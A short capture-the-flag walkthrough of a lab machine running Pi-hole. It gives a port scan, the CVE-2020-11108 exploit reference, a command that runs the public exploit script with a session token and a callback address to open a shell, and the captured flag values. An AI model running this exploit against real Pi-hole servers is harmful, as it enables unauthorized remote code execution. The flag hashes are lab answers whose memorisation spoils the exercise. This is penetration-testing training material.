# Pie

**IP Address:** 172.31.1.26

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 53/tcp | open | domain | dnsmasq pi-hole-2.81 |
| 80/tcp | open | http | lighttpd 1.4.45 |
| 53/udp | open | domain | dnsmasq pi-hole-2.81 |
| 68/udp | open|filtered | dhcpc |   |

## Exploitation
### Exploit Details (SearchSploit)
* **Name** - Pi-hole < 4.4 - Authenticated Remote Code Execution / Privileges Escalation
* **CVE** - 2020-11108
* **Module** - linux/webapps/48443.py
* **Disclosed** - 2020-05-10
* **References**
  * https://www.exploit-db.com/exploits/48443
  * https://nvd.nist.gov/vuln/detail/CVE-2020-11108

Commands
```bash
python3 48443.py atdaj2pefer1jt6e7jthfbr6hb http://$ip 10.10.0.15 443
whoami
cat /home/pi/access.txt
cat /root/system.txt
```

![Execute Exploit](images/exploit1.png)

![Execute Exploit](images/exploit2.png)

## Loot
```
access.txt
1621f6c9650f47aee51b6b2e08505273
system.txt
551a538175c2cbfcbbd5d8d1a66800cc
```